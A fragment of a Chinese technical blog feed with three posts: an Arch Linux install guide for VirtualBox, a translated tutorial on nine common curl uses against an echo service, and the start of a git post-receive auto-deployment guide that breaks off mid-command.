    <content type="html"><![CDATA[<p>简单地写一下在VirtualBox上安装Arch Linux的过程，以此为在PC上安装做准备。在PC上安装的过程和下面描述的基本一致。</p><span id="more"></span><p>##0x00 准备</p><ol><li><p>下载iso文件：在Arch官网上<a href="https://www.archlinux.org/download/">下载</a>最新的镜像，这里我选用了<a href="http://mirrors.163.com/archlinux/iso/2015.01.01/">163.com</a>节点的资源，下载archlinux-2015.01.01-dual.iso；</p></li><li><p>检查文件的完整性：在MAC中使用md5或者sha1检验文件的完整行，并和下载站点提供的值进行比较。</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ openssl sha1 archlinux-2014.12.01-dual.iso </span><br><span class="line">SHA1(archlinux-2014.12.01-dual.iso)= 86085153f97f0097fd0a02496e67cf85138c1ba5</span><br><span class="line"></span><br><span class="line">$ md5 archlinux-2014.12.01-dual.iso </span><br><span class="line">MD5 (archlinux-2014.12.01-dual.iso) = 667ed3c5e935666edfd54a2271e05b72</span><br></pre></td></tr></table></figure></li></ol><p>##0x01 创建虚拟机</p><ol><li><p>给虚拟机一个名字<img src="/media/files/2015/Jan/0-NameAndOperatingSystem.png"><img></p></li><li><p>内存：最小为256MB<img src="/media/files/2015/Jan/1-MemorySize.png"><img></p></li><li><p>创建新的虚拟磁盘<img src="/media/files/2015/Jan/2-HardDrive.png"><img></p></li><li><p>文件类型<img src="/media/files/2015/Jan/3-HardDriveFileType.png"><img></p></li><li><p>动态分配<img src="/media/files/2015/Jan/4-StorageOnPhysicalHardDrive.png"><img></p></li><li><p>文件位置和大小，最小10GB<img src="/media/files/2015/Jan/5-FileLocationAndSize.png"><img></p></li><li><p>如果要安装桌面环境的话就勾选<code>Enable 3D Acceleration</code><img src="/media/files/2015/Jan/6-Enable3DAcceleration.png"><img></p></li><li><p>第一次启动虚拟机时，选取之前下载的ISO文件<img src="/media/files/2015/Jan/7-SelectISOFile.png"><img></p></li></ol><p>##0x01 开始安装</p><ol><li><p>选择32位或者64位Arch<img src="/media/files/2015/Jan/8-BootArchLinux.png"><img></p><p>一旦看到如下提示，就可以开始进行配置了：<img src="/media/files/2015/Jan/9-Command.png"><img></p></li><li><p>更改键盘布局和设置语言：</p><p>默认键盘布局为<code>us</code>，非us布局可以用如下命令修改：</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># loadkeys layout</span></span><br></pre></td></tr></table></figure><p>layout可以是<code>uk</code>, <code>dvorak</code>等。设置语言：</p></li><li><p>磁盘分区</p><p>先看一下磁盘状态：</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls /dev</span></span><br></pre></td></tr></table></figure><p>开始啦，一般创建四个分区：<code>/</code>, <code>/boot</code>, <code>/home</code>, <code>swap</code></p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdisk /dev/sda</span><br></pre></td></tr></table></figure><p>当出现下面命令时, 开始分区，一下以<code>/boot</code>分区为例：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Command (? for help):</span><br></pre></td></tr></table></figure><p>a. 创建新分区：'n’b. 分区号码：回车默认从0开始递增c. “first sector”: 回车默认从上一个分区结束处开始，初始为0d. “last sector”: '+250MB’e. “hex code”: 回车默认（8300 为&quot;Linux File System&quot;），<code>swap</code>分区输入8200, 见<a href="http://www.basicconfig.com/hex_codes_system_id">这儿</a></p><p>依次给<code>swap</code>分配’+1G’（和分配的RAM一样大），<code>/boot</code>分配’+8G’，<code>/home</code>分配’+1G’，再次看一下磁盘的状态，可以看到已经分配好了，键入’w’并回车即可保存修改。</p></li><li><p>格式化分区</p><p>再次回到命令行：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@archiso ~ #</span><br></pre></td></tr></table></figure><p>格式化分区：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mkfs -t ext4 /dev/sda1</span><br><span class="line"># mkfs -t ext4 /dev/sda3</span><br><span class="line"># mkfs -t ext4 /dev/sda4</span><br><span class="line"></span><br><span class="line"># mkswap /dev/sda2</span><br></pre></td></tr></table></figure></li><li><p>挂载新分区</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># swapon /dev/sda2</span><br><span class="line"></span><br><span class="line"># mount /dev/sda3 /mnt</span><br><span class="line"># cd /mnt</span><br><span class="line"># mkdir boot home</span><br><span class="line"># mount /dev/sda1 boot</span><br><span class="line"># mount /dev/sda4 home</span><br></pre></td></tr></table></figure></li><li><p>安装Arch</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cd /</span><br><span class="line"># pacstrap /mnt base base-devel</span><br></pre></td></tr></table></figure></li><li><p>生成<code>fstab</code>文件</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># genfstab -p /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure><p>可以看看fstab里面的内容：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># more /mnt/etc/fstab</span><br></pre></td></tr></table></figure></li><li><p>初始化安装Boot Loader</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pacstrap /mnt syslinux</span><br></pre></td></tr></table></figure></li><li><p>配置安装</p><p>运行以下命令：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># arch-chroot /mnt</span><br></pre></td></tr></table></figure><p>得到：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh-4.2#</span><br></pre></td></tr></table></figure><p>这个shell很基础，用Bash也许更好些：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># bash</span><br></pre></td></tr></table></figure><p>得到：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@archiso /]#</span><br></pre></td></tr></table></figure><p>设置语言：</p> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nano /etc/locale.conf</span></span><br></pre></td></tr></table></figure><p>添加：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LANG=&quot;en_US.UTF-8&quot;</span><br></pre></td></tr></table></figure> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nano /etc/locale.gen</span></span><br></pre></td></tr></table></figure><p>将下面两行前面<code>#</code>去除：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">en_US.UTF-8 UTF-8</span><br><span class="line">de_DE.UTF-8 UTF-8</span><br></pre></td></tr></table></figure><p>完成语言设置：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># locale-gen</span><br></pre></td></tr></table></figure><p>设置时间：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ln -s /usr/share/zoneinfo/&lt;your_state&gt;/&lt;your_city&gt; /etc/localtime</span><br></pre></td></tr></table></figure><p>比如我设置的是：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ln -s /usr/share/zoneinfo/Asia/Chongqing /etc/localtime</span><br></pre></td></tr></table></figure><p>改hostname：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nano /etc/hostname</span><br></pre></td></tr></table></figure></li><li><p>完成Bootloader安装</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cd /boot/syslinux/</span><br></pre></td></tr></table></figure><p>打开syslinux.cfg文件，找到&quot;comboot modules&quot;一段：</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># more syslinux.cfg</span><br></pre></td></tr></table></figure><p>将其中列举的文件copy到本地，同时还要加上’libutil.c32’:</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cp /usr/lib/syslinux/bios/menu.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/vesamenu.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/chain.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/hdt.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/reboot.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/poweroff.c32 .</span><br><span class="line"># cp /usr/lib/syslinux/bios/libutil.c32 .</span><br></pre></td></tr></table></figure><p>一旦完成上述设置，</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># extlinux --install /boot/syslinux</span><br><span class="line"># dd conv=notrunc bs=440 count=1 if=/usr/lib/syslinux/bios/gptmbr.bin of=/dev/sda</span><br><span class="line"># mkinitcpio -p linux</span><br></pre></td></tr></table></figure></li><li><p>完成安装</p><p>最后，更改root密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># passwd</span><br></pre></td></tr></table></figure><p>输入两次<code>exit</code>退回到：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@archiso /]#</span><br></pre></td></tr></table></figure><p>umount所有的分区：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># umount /mnt/boot</span><br><span class="line"># umount /mnt/home</span><br><span class="line"># swapoff /dev/sda2</span><br><span class="line"># umount /mnt</span><br></pre></td></tr></table></figure><p>在重启之前最后一步，设置<code>/boot</code>分区的<a href="http://en.wikipedia.org/wiki/BIOS">BIOS</a>标识为’bootable’：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sgdisk /dev/sda --attributes=1:set:2</span><br></pre></td></tr></table></figure></li><li><p>重启Arch</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># reboot</span><br></pre></td></tr></table></figure><p>重启之后会再次进入CD启动，这时，去除安装CD，再次重启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Devices &gt; CD/DVD Devices &gt; Remove disk from virtual drive</span><br></pre></td></tr></table></figure><p>等待一小会：</p><p><img src="/media/files/2015/Jan/10-ArchLinux.png"><img></p><p>Congradulations!</p></li><li><p>后续工作</p><p>链接网络：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure><p>安装’sudo’：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pacman -S sudo</span><br></pre></td></tr></table></figure><p>添加’sudoer’:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nano /etc/sudoers</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##</span><br><span class="line">## User privilege specification</span><br><span class="line">##</span><br><span class="line">root ALL=(ALL) ALL</span><br><span class="line">qiwihui ALL=(ALL) ALL</span><br></pre></td></tr></table></figure><p>保存，并log out：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># exit</span><br></pre></td></tr></table></figure><p>以新的ID和密码重新登录。</p><p>最后，每次登录的时候自动获取ip：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># sudo systemctl enable dhcpcd@eth0.service</span><br></pre></td></tr></table></figure></li></ol><p>这样最基本的Arch Linux就好了，Desktop Environment就不装了。</p><h2><span id="0x02-can-kao-wen-dang">0x02 参考文档</span></h2><ul><li><a href="https://wiki.archlinux.org/index.php/Beginners%27_guide">Arch Linux Beginners’ guide</a></li><li><a href="https://wiki.archlinux.org/index.php/Installation_guide">Arch Linux Installation Guide</a></li><li><a href="http://wideaperture.net/blog/?p=3851">A Guide to Installing Arch in VirtualBox</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      在VirtualBox安装Arch Liux初步指南
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>9个值得知道的cURL的用法</title>
    <link href="https://qiwihui.com/qiwihui-blog-19/"/>
    <id>https://qiwihui.com/qiwihui-blog-19/</id>
    <published>2018-10-09T05:33:38.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>对于 HTTP 工程师和 API 设计师来说，使用命令行操作 HTTP 是非常有用的技能。<a href="http://curl.haxx.se/">cURL</a>库和 <code>curl</code> 命令可以给你设计请求，放入管道并查看相应的能力。<code>curl</code> 能力的缺点在于它能覆盖多广的命令选项。使用 <code>curl --help</code> 会展示出150条不同的选项。这篇文章演示了9个基本的，现实程序用到的 <code>curl</code> 命令。</p><span id="more"></span><p>在这篇教程中我们会使用httpkit的 <a href="http://echo.httpkit.com/">echo</a> 服务做为端点，回显服务的响应是它收到 HTTP 请求的 JSON 表示。</p><h2><span id="chuang-jian-qing-qiu">创建请求</span></h2><p>我们从最简单的 <code>curl</code> 命令开始。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;GET&quot;,</span><br><span class="line">  &quot;uri&quot;: &quot;/&quot;,</span><br><span class="line">  &quot;path&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;/&quot;,</span><br><span class="line">    &quot;query&quot;: &quot;&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;host&quot;: &quot;echo.httpkit.com&quot;,</span><br><span class="line">    &quot;user-agent&quot;: &quot;curl/7.24.0 ...&quot;,</span><br><span class="line">    &quot;accept&quot;: &quot;*/*&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;body&quot;: null,</span><br><span class="line">  &quot;ip&quot;: &quot;28.169.144.35&quot;,</span><br><span class="line">  &quot;powered-by&quot;: &quot;http://httpkit.com&quot;,</span><br><span class="line">  &quot;docs&quot;: &quot;http://httpkit.com/echo&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就这样，我们用 <code>curl</code> 创建了一个请求，<code>curl</code> 使用的 HTTP 动词默认为 <code>GET</code>，请求的资源指向的是<a href="http://httpkit.com/">httpkit</a> 的 <a href="http://httpkit.com/echo">echo</a> 服务：<code>http://echo.httpkit.com</code>。</p><p>你可以添加路径和查询变量：</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://echo.httpkit.com//path?query=string</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; ...</span><br><span class="line">  &quot;uri&quot;: &quot;/path?query=string&quot;,</span><br><span class="line">  &quot;path&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;/path&quot;,</span><br><span class="line">    &quot;query&quot;: &quot;?query=string&quot;,</span><br><span class="line">    &quot;params&quot;: &#123;</span><br><span class="line">      &quot;query&quot;: &quot;string&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="she-zhi-qing-qiu-fang-fa">设置请求方法</span></h2><p><code>curl</code>默认的请求方法为 <code>GET</code> ，可以用 <code>-X</code> 参数设置成任何你想要的方法，通常为 <code>POST</code>，<code>PUT</code>，<code>DELETE</code>方法，甚至是自定义的方法。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正如你看到的，<code>http://</code> 协议前缀可以不使用，因为这是默认假定的。接着实施 <code>DELETE</code> 方法：</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X DELETE echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;method&quot;: &quot;DELETE&quot;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="she-zhi-qing-qiu-tou-bu">设置请求头部</span></h2><p>请求头部允许客户端给服务器提供诸如授权，内容类型等信息。比如，OAuth2 使用 <code>Authorization</code> 头来传递访问令牌（access tokens）。<code>curl</code> 使用 <code>-H</code> 选项设置自定义头部。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Authorization: OAuth 2c4419d1aabeec&quot; \</span><br><span class="line">     http://echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;...</span><br><span class="line">&quot;headers&quot;: &#123;</span><br><span class="line">    &quot;host&quot;: &quot;echo.httpkit.com&quot;,</span><br><span class="line">    &quot;authorization&quot;: &quot;OAuth 2c4419d1aabeec&quot;,</span><br><span class="line">  ...&#125;,</span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure><p>可以使用 <code>-H</code> 多次来设置多个头部。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Accept: application/json&quot; \</span><br><span class="line">     -H &quot;Authorization: OAuth 2c3455d1aeffc&quot; \</span><br><span class="line">     http://echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; ...</span><br><span class="line">  &quot;headers&quot;: &#123; ...</span><br><span class="line">    &quot;host&quot;: &quot;echo.httpkit.com&quot;,</span><br><span class="line">    &quot;accept&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;authorization&quot;: &quot;OAuth 2c3455d1aeffc&quot; </span><br><span class="line">   &#125;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="fa-song-qing-qiu-ti">发送请求体</span></h2><p>现今许多有名的 HTTP API 使用 <code>application/json</code> 和 <code>application/xml</code> 来 <code>POST</code> 和 <code>PUT</code> 资源，而不是用HTML化的数据。我们试试 <code>PUT</code> 一些 JSON 数据到服务器上。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X PUT \</span><br><span class="line">     -H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">     -d &#x27;&#123;&quot;firstName&quot;:&quot;Kris&quot;, &quot;lastName&quot;:&quot;Jordan&quot;&#125;&#x27;</span><br><span class="line">     echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;method&quot;: &quot;PUT&quot;, ...</span><br><span class="line">   &quot;headers&quot;: &#123; ...</span><br><span class="line">     &quot;content-type&quot;: &quot;application/json&quot;,</span><br><span class="line">     &quot;content-length&quot;: &quot;40&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;body&quot;: &quot;&#123;\&quot;firstName\&quot;:\&quot;Kris\&quot;,\&quot;lastName\&quot;:\&quot;Jordan\&quot;&#125;&quot;,</span><br><span class="line">   ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2><span id="shi-yong-wen-jian-zuo-wei-qing-qiu-ti">使用文件作为请求体</span></h2><p>将 JSON/XML 写到命令行中是令人头疼的，尤其有时这个文件很大时。幸运的是， <code>curl</code> 的 <code>@readfile</code>可以很容易地读取文件的文本。如果上面例子中的 JSON 保存为文件 <code>example.json</code>， 我们可以这么做：</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X PUT \</span><br><span class="line">     -H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">     -d @example.json</span><br><span class="line">     echo.httpkit.com</span><br></pre></td></tr></table></figure><h2><span id="fa-song-html-biao-dan-shu-ju">发送 HTML 表单数据</span></h2><p>如果不能发送带有数据的请求体，可以设置类似 <code>POST</code> 的方法真是没什么用。也许我们可以试试发送 HTML表单数据。使用 <code>-d</code> 选项，我们可以制定 URL 编码的名称和值。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -d &quot;firstName=Kris&quot; \</span><br><span class="line">     -d &quot;lastName=Jordan&quot; \</span><br><span class="line">     echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;POST&quot;, ...</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;content-length&quot;: &quot;30&quot;,</span><br><span class="line">    &quot;content-type&quot;:&quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;body&quot;: &quot;firstName=Kris&amp;lastName=Jordan&quot;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到 <code>POST</code> 这个方法，即使我们没有指明方法，当 <code>curl</code> 看到表单数据时它会指定 <code>POST</code> 方法。可以使用 <code>-X</code> 选项来覆盖这个方法。请求的 <code>Content-Type</code> 也被自动设置为 <code>application/x-www-form-urlencoded</code>，这样服务器就知道怎么解析数据了。最终，请求体由编码了每一个表单域的 URL 构成。</p><h2><span id="fa-song-html-multipart-file-biao-dan-shang-chuan-wen-jian">发送 HTML Multipart/file 表单（上传文件）</span></h2><p>当涉及到文件上传的表单时，正如你从写上传文件表单时知道的那样，这些使用 <code>multipart/form-data</code> 文本类型，带有 <code>enctype</code> 属性。cURL 使用 <code>-F</code> 配合上面介绍的 <code>@readFile</code> 宏来处理。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -F &quot;firstName=Kris&quot; \</span><br><span class="line">     -F &quot;publicKey=@idrsa.pub;type=text/plain&quot; \</span><br><span class="line">     echo.httpkit.com</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;POST&quot;,</span><br><span class="line">  ...</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;content-length&quot;: &quot;697&quot;,</span><br><span class="line">    &quot;content-type&quot;: &quot;multipart/form-data;</span><br><span class="line">    boundary=----------------------------488327019409&quot;,</span><br><span class="line">    ... &#125;,</span><br><span class="line">  &quot;body&quot;: &quot;------------------------------488327019409\r\n</span><br><span class="line">           Content-Disposition: form-data;</span><br><span class="line">           name=\&quot;firstName\&quot;\r\n\r\n</span><br><span class="line">           Kris\r\n</span><br><span class="line">           ------------------------------488327019409\r\n</span><br><span class="line">           Content-Disposition: form-data;</span><br><span class="line">           name=\&quot;publicKey\&quot;;</span><br><span class="line">           filename=\&quot;id_rsa.pub\&quot;\r\n</span><br><span class="line">           Content-Type: text/plain\r\n\r\n</span><br><span class="line">           ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAkq1lZYUOJH2</span><br><span class="line">           ... more [a-zA-Z0-9]* ...</span><br><span class="line">           naZXJw== krisjordan@gmail.com\n\r\n</span><br><span class="line">           ------------------------------488327019409</span><br><span class="line">           --\r\n&quot;,</span><br><span class="line">...&#125;</span><br></pre></td></tr></table></figure><p>像 <code>-d</code> 选项一样，当使用 <code>-d</code> 选项时 <code>curl</code> 会自动地默认使用 <code>POST</code> 方法，<code>multipart/form-data</code> 文件类型头部，计算长度并组成请求体。请注意 <code>@readFile</code>  宏是怎样读取一个文件的文本为任何字符的，这个不是一个单独的操作，<code>;text/plain</code> 指定了文件的 MIME 文本类型。在未指定的情况下，<code>curl</code> 会尝试嗅探文本类型。</p><h2><span id="ce-shi-xu-ni-zhu-ji-bu-shi-yong-dns">测试虚拟主机，不使用 DNS</span></h2><p>通常，在不修改 DNS 覆盖主机的情况下测试一个虚拟主机或者是缓存代理时很有用的。只需使用 cURL 将请求指向主机的 IP 地址 并覆写 <code>Host</code> 头。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Host: google.com&quot; 50.112.251.120</span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;GET&quot;, ...</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;host&quot;: &quot;google.com&quot;, ...</span><br><span class="line">  &#125;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="cha-kan-xiang-ying-tou-bu">查看响应头部</span></h2><p>API 正越来越多的利用响应头部来提供授权，速率限制，缓存等方面的信息。cURL 使用 <code>-i</code> 选项来查看响应头部和响应体。</p><p><strong>请求</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -i echo.httpkit.com </span><br></pre></td></tr></table></figure><p><strong>响应</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.1.19</span><br><span class="line">Date: Wed, 29 Aug 2012 04:18:19 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 391</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: http://httpkit.com</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;GET&quot;,</span><br><span class="line">  &quot;uri&quot;: &quot;/&quot;, ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原文：<a href="http://httpkit.com/resources/HTTP-from-the-Command-Line/">9 uses for cURL worth knowing</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      9个值得知道的cURL的用法
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>使用 Git Hooks 实现项目自动部署</title>
    <link href="https://qiwihui.com/qiwihui-blog-18/"/>
    <id>https://qiwihui.com/qiwihui-blog-18/</id>
    <published>2018-10-09T05:32:54.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>自动化部署解放双手，发展生产力，更重要的是可以减少部署过程中的错误操作。</p><span id="more"></span><p>之前使用git做为我博客的版本控制，使用Github Pages托管我的博客，所以部署方面都交给了github，但是当我要部署另一个web应用时，显然要部署在自己的VPS上，把VPS做为git服务器的同时，每次push代码到服务器上都要手动运行一次脚本更新服务，这样做简直劳神伤力。</p><p>幸运的是Git提供了Hook机制用来帮助我们实现自动部署。Hooks分为客户端和服务端，可以用来处理不同的工作，这些hooks都被存储在 Git 目录下的hooks子目录中，即大部分项目中的<code>.git/hooks</code>。 Git 默认会放置一些脚本样本在这个目录中，除了可以作为hooks使用，这些样本本身是可以独立使用的，这些样本名都是以.sample结尾，必须重新命名。</p><p>这次主要用到服务端的hooks: <code>post-receive</code>。当用户在本地仓库执行<code>git push</code>命令时，服务器上运端仓库就会对应执行<code>git receive pack</code>命令；在所有远程仓库的引用(ref)都更新后，这个钩子就会被调用。与之对应的是<code>pre-receive</code>，这个会在更新之前被调用。</p><p>环境要求：</p><ol><li>要求客户端和服务端都有git环境，而且服务端最好已经部署好了；</li><li>能连上服务器</li></ol><h2><span id="0x01-shi-jian">0x01 实践</span></h2><p>我们的实践过程会按照下边的过程实施：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+------------------------+          +------------------------+</span><br><span class="line">|                        |          |                        |</span><br><span class="line">|  +-----------------+   |   push   |  +-------------------+ |</span><br><span class="line">|  |local repository |---+----------+-&gt;| remote repository | |</span><br><span class="line">|  +-----------------+   |          |  +-------------------+ |</span><br><span class="line">|                        |          |             |          |</span><br><span class="line">+------------------------+          |             |pull      |</span><br><span class="line">                                    |             V          |</span><br><span class="line">     local machine                  |  +-------------------+ |</span><br><span class="line">                                    |  |     deployment    | |</span><br><span class="line">                                    |  +-------------------+ |</span><br><span class="line">                                    |                        |</span><br><span class="line">                                    +------------------------+</span><br><span class="line"></span><br><span class="line">                                             server</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="zai-server-shang-chu-shi-hua-yi-ge-yuan-cheng-luo-cang-ku">在server上初始化一个远程裸仓库：</span></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ <span class="built_in">mkdir</span> remoteRepo</span><br><span class="line">$ <span class="built_in">cd</span> remoteRepo</span><br><span class="line">$ git init --bare webapp.git</span><br></pre></td></tr></table></figure><h4><span id="zai-server-shang-chu-shi-hua-yi-ge-ben-di-cang-ku-zuo-wei-web-app-de-dai-ma">在server上初始化一个本地仓库，做为web app的代码：</span></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ <span class="built_in">mkdir</span> deployment</span><br><span class="line">$ <span class="built_in">cd</span> deployment</span><br><span class="line">$ git <span class="built_in">clone</span> ~/remoteRepo/webapp.git webapp</span><br></pre></td></tr></table></figure><h4><span id="wei-yuan-cheng-cang-ku-tian-jia-hook">为远程仓库添加hook：</span></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> 